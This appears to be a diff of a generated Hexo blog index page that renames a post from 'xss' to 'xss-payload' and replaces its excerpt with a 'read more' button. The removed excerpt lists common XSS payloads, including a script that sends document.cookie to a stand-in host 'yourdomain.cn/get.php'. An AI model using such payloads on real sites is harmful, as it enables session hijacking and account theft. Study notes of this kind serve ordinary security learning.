@@ -236,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/24/xss/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/24/xss-payload/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Alair Lee">
@@ -250,7 +250,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/2019/08/24/xss/" class="post-title-link" itemprop="url">xss</a>
+            <a href="/2019/08/24/xss-payload/" class="post-title-link" itemprop="url">xss-payload</a>
           
         </h1>
 
@@ -265,7 +265,7 @@
                 
               
 
-              <time title="创建时间：2019-08-24 15:49:10 / 修改时间：15:49:44" itemprop="dateCreated datePublished" datetime="2019-08-24T15:49:10+08:00">2019-08-24</time>
+              <time title="创建时间：2019-08-24 15:49:10 / 修改时间：15:57:02" itemprop="dateCreated datePublished" datetime="2019-08-24T15:49:10+08:00">2019-08-24</time>
             </span>
           
             
@@ -297,9 +297,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="常用的payload："><a href="#常用的payload：" class="headerlink" title="常用的payload："></a>常用的payload：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;svg/</span>onload=<span class="string">"alert("</span>xss<span class="string">")"</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="cookie的利用"><a href="#cookie的利用" class="headerlink" title="cookie的利用"></a>cookie的利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;window.open('http:/</span><span class="regexp">/yourdomain.cn/g</span>et.php?cookie=<span class="string">'+document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+          <h3 id="常用的payload："><a href="#常用的payload：" class="headerlink" title="常用的payload："></a>常用的payload：</h3>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/08/24/xss-payload/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
